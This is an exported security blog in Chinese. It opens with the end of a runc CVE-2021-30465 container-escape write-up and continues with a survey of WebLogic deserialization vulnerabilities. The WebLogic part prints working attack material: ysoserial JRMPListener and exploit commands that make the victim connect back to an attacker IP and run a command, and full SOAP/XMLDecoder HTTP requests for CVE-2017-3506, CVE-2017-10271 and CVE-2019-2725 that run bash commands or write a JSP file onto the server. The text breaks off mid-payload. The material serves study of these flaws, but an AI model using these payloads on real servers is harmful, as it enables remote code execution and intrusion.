<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">/var/lib/kubelet/pods/$</span><span class="bash">MY_POD_UID/volumes/kubernetes.io~empty-dir/test2 -&gt; /</span></span><br></pre></td></tr></tbody></table></figure>

<p>这里解释一下上面这种变化，本来/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2内部如下</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ls -al /var/lib/kubelet/pods/<span class="variable">$MY_POD_UID</span>/volumes/kubernetes.io~empty-dir/test2</span></span><br><span class="line"><span class="meta">/var/lib/kubelet/pods/$</span><span class="bash">MY_POD_UID/volumes/kubernetes.io~empty-dir/test2/test2 -&gt; /</span></span><br></pre></td></tr></tbody></table></figure>

<p>在进行 <code>mount(/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2, /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/)</code> 操作之后， <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</code> 就相当于成了 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2</code> ，中间的一个test2目录被去掉了</p>
<p>当我们做最后的挂载时</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">mount(/var/lib/kubelet/pods/$</span><span class="bash">MY_POD_UID/volumes/kubernetes.io~empty-dir/test2, /run/containerd/io.containerd.runtime.v2.task/k8s.io/SOMERANDOMID/rootfs/test1/zzz)</span></span><br></pre></td></tr></tbody></table></figure>

<p>相当于</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mount(/, /run/containerd/io.containerd.runtime.v2.task/k8s.io/SOMERANDOMID/rootfs/test1/zzz)</span><br></pre></td></tr></tbody></table></figure>

<p>一切顺利的话，逃逸成功！</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前看来只使用docker基本没有攻击场景，需要结合类似k8s这种对容器进行编排的工具才能进行利用。漏洞利用需要多个容器挂载同一个文件卷，现在有的利用方式就是攻击者能控制用户使用攻击者构造的恶意 yaml 文件来生成pod，这样才有机会进行漏洞利用并逃逸到宿主机。</p>
<p>而且因为是利用竞争条件来进行利用的，有很大概率失败，我本地测试同一个pod里放了20个容器，能成功逃逸一个。</p>
<p>poc的利用方法是将c2+容器使用的镜像先设置为无效的镜像，待c1内布置好再更新合法的镜像给c2+;如果没有更新镜像的能力，也可以将c2+的镜像设置为很大的镜像或者延迟加载，要做到c1布置好后才进行c2+的容器生成，才有机会进行漏洞利用。</p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul>
<li><a href="http://blog.champtar.fr/runc-symlink-CVE-2021-30465/" target="_blank" rel="noopener">http://blog.champtar.fr/runc-symlink-CVE-2021-30465/</a></li>
<li><a href="https://www.gushiciku.cn/pl/gPyn" target="_blank" rel="noopener">https://www.gushiciku.cn/pl/gPyn</a></li>
<li><a href="https://www.gushiciku.cn/pl/gysF" target="_blank" rel="noopener">https://www.gushiciku.cn/pl/gysF</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f" target="_blank" rel="noopener">https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f</a></li>
<li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-c3xm-pvg7-gh7r" target="_blank" rel="noopener">https://github.com/opencontainers/runc/security/advisories/GHSA-c3xm-pvg7-gh7r</a></li>
<li><a href="https://github.com/cyphar/filepath-securejoin/blob/40f9fc27fba074f2e2eebb3f74456b4c4939f4da/join.go#L57-L60" target="_blank" rel="noopener">https://github.com/cyphar/filepath-securejoin/blob/40f9fc27fba074f2e2eebb3f74456b4c4939f4da/join.go#L57-L60</a></li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>容器逃逸</category>
      </categories>
      <tags>
        <tag>CVE-2021-30465,docker,runc,容器逃逸,云原生</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic基础简介及系列漏洞调试总结</title>
    <url>/posts/1610177997/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>weblogic是作为我入门 Java 安全第一个跟踪分析的框架及漏洞点，当写下这篇文章的时候我也是准备从零开始分析调试weblogic历史上全部的 RCE 漏洞。在整个过程中收获良多，为了确保对此系列漏洞的理解到位，不产生太离谱的偏差，一遍又一遍的 Debug，同时参考了网上无数的相关复现文章，消耗了大量的时间，在漏洞分析过程中，由于很多细节自己知识匮乏，也没有解释的太明白，在漏洞复现的时候也没有跟的太深，但是也没办法了，以我目前的能力只能做到这个程度了。</p>
<p>希望感兴趣的读者能够按照从前到后的顺序进行查看，否则可能有看不懂的情况，因为我在写的过程中也是跟随漏洞版本，利用已有的知识进行编制和测试的，所以会有一定的前置知识的需求。</p>
<p>部分内容引用自jjf012的文章，现注明出处！如有侵权，请联系我删除~</p>
<blockquote>
<p>作者：jjf012<br>链接：<a href="https://www.jianshu.com/p/38033935a914" target="_blank" rel="noopener">https://www.jianshu.com/p/38033935a914</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>点击左边连接可以直接跳到对应漏洞的调试记录。</p>
<table>
<thead>
<tr>
<th align="center">链接</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#start" target="_blank" rel="noopener">攻击Java Web应用</a></td>
<td align="center">Java安全相关技术、IDEA调试技巧</td>
</tr>
<tr>
<td align="center"><a href="https://functfan.github.io/posts/4114466392/">weblogic简介及补丁分析方法(转)</a></td>
<td align="center">weblogic基础及补丁分析</td>
</tr>
<tr>
<td align="center"><a href="https://functfan.github.io/posts/914084023/">weblogicT3协议及T3反序列化漏洞简介</a></td>
<td align="center">weblogic RMI T3必须知道的知识</td>
</tr>
<tr>
<td align="center"><a href="https://functfan.github.io/posts/2831946175/">weblogic环境部署与远程调试</a></td>
<td align="center">weblogic环境部署与远程调试</td>
</tr>
<tr>
<td align="center"><a href="https://functfan.github.io/posts/754158022/">CVE-2015-4852-Weblogic反序列化漏洞复现与分析</a></td>
<td align="center">CVE-2015-4852漏洞复现与分析</td>
</tr>
<tr>
<td align="center">待补充其他</td>
<td align="center">待补充其他</td>
</tr>
</tbody></table>
<h3 id="历史漏洞整理"><a href="#历史漏洞整理" class="headerlink" title="历史漏洞整理"></a>历史漏洞整理</h3><h4 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h4><blockquote>
<ul>
<li>什么是RMI：远程方法调用<code>(Remote Method Invocation)</code>。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。</li>
<li>Java远程消息交换协议 JRMP 即<code>Java Remote MessagingProtocol</code>，是特定于<code>Java</code>技术的、用于查找和引用远程对象的协议。这是运行在<code>Java</code>远程方法调用<code>RMI</code>之下、<code>TCP/IP</code>之上的线路层协议。，也可以使用<code>CORBA</code>兼容的方法实现。详细介绍请参考：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fcdl2008sky%2Farticle%2Fdetails%2F6844719" target="_blank" rel="noopener">https://blog.csdn.net/cdl2008sky/article/details/6844719</a></li>
</ul>
</blockquote>
<p>T3协议是用于Weblogic服务器和其他Java Application之间传输信息的协议，是实现上述RMI远程过程调用的专有协议，其允许客户端进行<code>JNDI</code>调用。</p>
<p>当Weblogic发起一个T3协议连接的时候，Weblogic会连接每一个Java虚拟机并传输流量，由于通信过程得到了极大的简化，所以使得其在操作系统资源利用上实现的高效以及最大化，同时提高了传输速度。</p>
<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>此漏洞主要是由于apache的标准库中<code>Apache Commons Collections</code>基础库的<code>TransformedMap</code>类中。根据<code>@breenmachine</code>的文章，他当时找漏洞的方法是，对weblogic在<code>7001</code>端口的<code>T3</code> 协议进行抓包，发现流量中有<code>java</code>反序列化之后Magic(<strong>幻数</strong>)<code>ac ed 00 05</code>，然后替换掉对应的部分。</p>
<p>利用方式等同下面的<code>CVE-2016-3510</code>，只不过payload不一样。</p>
<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>此漏洞是基于CVE-2015-4852漏洞进行黑名单的绕过，CVE-2015-4852补丁主要应用在三个位置上：</p>
<ul>
<li>weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream</li>
<li>weblogic.rjvm.MsgAbbrevInputStream.class</li>
<li>weblogic.iiop.Utils.class</li>
</ul>
<p>所以如果能找到可以在其<code>readObject</code>中创建自己的<code>InputStream</code>的对象，并且不是使用黑名单中的<code>ServerChannelInputStream</code>和<code>MsgAbbrevInputStream</code>的<code>readExternal</code>进行的反序列化，最后调用<code>readObject()</code>方法进行反序列化的数据的读取，这样就可以执行含有恶意代码的序列化代码。依据这个思路找到了<code>weblogic.jms.common.StreamMessageImpl</code>类，其中的<code>readExternal()</code>方法也符合攻击的需求。</p>
<p>利用方式等同下面的<code>CVE-2016-3510</code>，只不过payload不一样。</p>
<h5 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h5><p>此漏洞是与CVE-2016-0638漏洞利用方式相似，只是选择了<code>weblogic.corba.utils.MarshalledObject</code>进行绕过，<strong>绕过</strong>之前的<code>CVE-2015-4852</code>和<code>CVE-2016-0638</code>漏洞的修复补丁。<br> 利用方式参照 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Fblob%2Fmaster%2FCVE%20Exploits%2FWebLogic%20CVE-2016-3510.py" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/WebLogic%20CVE-2016-3510.py</a></p>
<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p><code>Apache Commons Collections</code>基础的漏洞已经进行修补，所以<code>CVE-2017-3248</code>漏洞利用方法与之前三个漏洞不同，这次主要是利用了<code>JRMP java</code>远程方法协议。<br> 利用<code>java.rmi.registry.Registry</code>，序列化<code>RemoteObjectInvocationHandler</code>，并使用<code>UnicastRef</code>和远端建立tcp连接，获取<code>RMI registry</code>，最终将加载的内容利用<code>readObject()</code>进行解析，导致之前序列化的恶意代码执行。<br> 利用方式可以参照 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fquentinhardy%2FscriptsAndExploits" target="_blank" rel="noopener">https://github.com/quentinhardy/scriptsAndExploits</a><br> 或者下面</p>
<h5 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h5><p>CVE-2018-2628漏洞与CVE-2017-3248漏洞利用方法类似，仅仅更换了使用的rmi接口，用<code>java.rmi.activation.Activator</code>替换了CVE-2017-3248所使用的<code>java.rmi.registry.Registry</code>，从而绕过<code>resolveProxyClass</code>的判断，成功绕过了CVE-2017-3248漏洞的修复补丁。</p>
<blockquote>
<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fvulhub.org%2F%23%2Fenvironments%2Fweblogic%2FCVE-2018-2628%2F" target="_blank" rel="noopener">vulhub演示地址</a></p>
</blockquote>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br></pre></td></tr></tbody></table></figure>

<p>其中，<code>[command]</code>即为想执行的命令，而<code>[listen port]</code>是<code>JRMP Server</code>监听的端口。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br></pre></td></tr></tbody></table></figure>

<p><code>[JRMPClient]</code>：有<code>JRMPClient</code>或<code>JRMPClient2</code>两个选项，两者只有接口类名的差别。然后weblogic就会回连到攻击者<code>JRMPListener ip</code>，执行<code>[command]</code></p>
<h5 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h5><p>CVE-2018-2893漏洞绕过方式是利用<code>StreamMessageImpl</code>对<code>ysoserial</code>工具中的<code>JRMPClient</code>生成的<code>payloadObject</code>进行封装。相当于使用<code>CVE-2016-0638</code>的利用方式加上<code>CVE-2017-3248</code>的 payload 来绕过补丁。</p>
<p>利用方式可参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Ftree%2Fmaster%2Fweblogic%2FCVE-2018-2628" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628</a></p>
<h5 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h5><p>没看到具体介绍，只知道也是T3协议的锅。</p>
<p>这里下载payload生成，<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvoidfyoo%2FCVE-2018-3191%2Freleases" target="_blank" rel="noopener">https://github.com/voidfyoo/CVE-2018-3191/releases</a></p>
<p><code>weblogic-spring-jndi-12.2.1.3.jar</code> for weblogic:</p>
<ul>
<li>12.2.1.3</li>
</ul>
<p><code>weblogic-spring-jndi-10.3.6.0.jar</code> for weblogic:</p>
<ul>
<li>10.3.6.0</li>
<li>12.2.1.0</li>
<li>12.1.3.0</li>
<li>12.2.1.1</li>
</ul>
<p>先生成一个payload，触发weblogic回连。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://攻击机ip:端口/exp &gt; payload</span><br></pre></td></tr></tbody></table></figure>

<p>攻击者IP开启rmi服务</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 "要执行的指令"</span><br></pre></td></tr></tbody></table></figure>

<p>然后用<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjas502n%2FCVE-2018-3191%2Fblob%2Fmaster%2Fweblogic.py" target="_blank" rel="noopener">weblogic.py</a>向weblogic发起请求</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">python weblogic.py 172.20.0.2 7001 payload</span><br></pre></td></tr></tbody></table></figure>

<p>weblogic就会回连到<code>攻击者IP</code>，然后执行<code>[command]</code></p>
<h5 id="CVE-2018-3197"><a href="#CVE-2018-3197" class="headerlink" title="CVE-2018-3197"></a>CVE-2018-3197</h5><p>没找到介绍</p>
<h5 id="CVE-2018-3201"><a href="#CVE-2018-3201" class="headerlink" title="CVE-2018-3201"></a>CVE-2018-3201</h5><p>没找到介绍</p>
<h5 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h5><p>是补来补去一直没有修好的Weblogic JRMP反序列化漏洞。只要满足继承<code>java.rmi.server.RemoteObject</code>,且不在黑名单之中的类对象。 这里通过<code>ReferenceWrapper_Stub</code>这个类对象绕过。</p>
<p>POC生成可以参考 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fpyn3rd%2FCVE-2018-3245" target="_blank" rel="noopener">https://github.com/pyn3rd/CVE-2018-3245</a></p>
<p>利用方式等同 <code>CVE-2018-3191</code></p>
<h5 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h5><p>CVE-2019-2890又又又绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。具体分析过程看 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.seebug.org%2F1069%2F" target="_blank" rel="noopener">https://paper.seebug.org/1069/</a>，文章的作者也给出了漏洞验证的方式：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSukaraLin%2FCVE-2019-2890" target="_blank" rel="noopener">https://github.com/SukaraLin/CVE-2019-2890</a></p>
<p>标记重点：需要先获取服务器上的密钥文件SerializedSystemIni.dat来加密序列化后的字节流，而这个文件每台服务器都不一样。这就是这个漏洞鸡肋的地方。</p>
<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><h5 id="CVE-2018-3252"><a href="#CVE-2018-3252" class="headerlink" title="CVE-2018-3252"></a>CVE-2018-3252</h5><p>DeploymentService组件存在反序列化漏洞，需要登陆后才能使用。POC生成可以参考 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fb1ueb0y%2FCVE-2018-3252" target="_blank" rel="noopener">https://github.com/b1ueb0y/CVE-2018-3252</a></p>
<h5 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h5><p>此漏洞主要是由于wls组件使用了<code>webservice</code>来处理<code>soap</code>请求，在<code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest</code>方法中，当<code>localHeader1</code>和<code>localHeader2</code>都不为null时，将会把<code>&lt;work:WorkContext&gt;</code>所包含的数据传入<code>weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld</code>方法，在此方法中，对<code>WorkContextXmlInputAdapter</code>类进行了实例化，并调用<code>WorkContextXmlInputAdapter</code>类的构造方法，通过<code>XMLDecoder()</code>进行反序列化操作。</p>
<p>可利用路径如下:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></tbody></table></figure>

<p>下面的POC等同于执行命令<code>/bin/bash -c "touch /tmp/123"</code></p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch /tmp/123<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h5 id="CVE-2017-10271-Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞"><a href="#CVE-2017-10271-Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞" class="headerlink" title="CVE-2017-10271 Weblogic < 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞"></a>CVE-2017-10271 Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞</h5><p><code>CVE-2017-10271</code>是对<code>CVE-2017-3506</code>修复补丁的一次绕过，可以看到唯一的变化就是把之前的<code>Object</code>标签变成了<code>void</code>标签。</p>
<ul>
<li><code>bea_wls9_async_response</code></li>
<li><code>_WL_internal/bea_wls_internal/9j4dqk/war/</code></li>
<li><code>uddiexplorer</code></li>
<li><code>_WL_internal/wls-wast</code></li>
</ul>
<p>访问<code>http://your-ip:7001/bea_wls_internal/test.jsp</code></p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print("test"); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>除此之外，网上还出现了一些变形的payload，大家发现可以直接利用new和method元素完成payload的构造，连void元素都不用了，所以payload还可以这样写：</p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">new</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">"start"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">new</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h5 id="CVE-2019-2725-wls9-async-反序列化漏洞"><a href="#CVE-2019-2725-wls9-async-反序列化漏洞" class="headerlink" title="CVE-2019-2725 wls9-async 反序列化漏洞"></a>CVE-2019-2725 wls9-async 反序列化漏洞</h5><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 172.xxx:7001</span><br><span class="line">Content-Length: 789</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">'http://schemas.xmlsoap.org/soap/envelope/'</span> <span class="attr">xmlns:wsa</span>=<span class="string">'http://www.w3.org/2005/08/addressing'</span> <span class="attr">xmlns:asy</span>=<span class="string">'http://www.bea.com/async/AsyncResponseService'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">'http://bea.com/2004/06/soap/workarea/'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">'java.lang.ProcessBuilder'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">'java.lang.String'</span> <span class="attr">length</span>=<span class="string">'3'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">'0'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">'1'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span 